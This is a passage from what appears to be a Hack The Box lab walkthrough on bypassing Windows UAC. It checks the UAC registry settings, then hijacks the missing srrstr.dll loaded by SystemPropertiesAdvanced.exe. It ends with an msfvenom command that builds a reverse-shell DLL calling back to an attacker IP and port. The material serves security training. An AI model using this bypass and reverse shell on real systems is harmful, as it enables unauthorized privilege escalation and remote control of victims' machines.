**Confirming UAC is Enabled**

There is no command-line version of the GUI consent prompt, so we will have to bypass UAC to execute commands with our privileged access token. First, let's confirm if UAC is enabled and, if so, at what level.

```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

**Checking UAC Level**

```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

This returns the build version 14393, which using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page we cross-reference to Windows release `1607`.

This specific lab is vulnerable to dll hijacking which occurs in the `SystemPropertiesAdvanced.exe` the 32 bit version of this attempts to load the non-existent DLL srrstr.dll

We can create the payload in our attack machine and send it back to the windows system with the srrstr.dll name.

We have to know which path in one of these are writable by us and inject it there.

```powershell-session
PS C:\htb> cmd /c echo %PATH%

C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
